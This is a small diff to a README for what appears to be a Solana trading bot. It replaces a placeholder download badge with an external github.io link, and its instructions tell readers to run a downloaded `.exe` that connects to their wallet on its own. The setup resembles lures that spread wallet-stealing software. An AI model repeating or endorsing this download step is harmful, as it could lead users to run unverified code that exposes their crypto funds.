@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 Run the `.exe` file to start the application.  
 The bot will automatically connect to your Solana wallet and be ready for configuration.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://solsniper-pro.github.io/.github/)
 
 ## 📸 Overview
 A quick look at key parts in action:
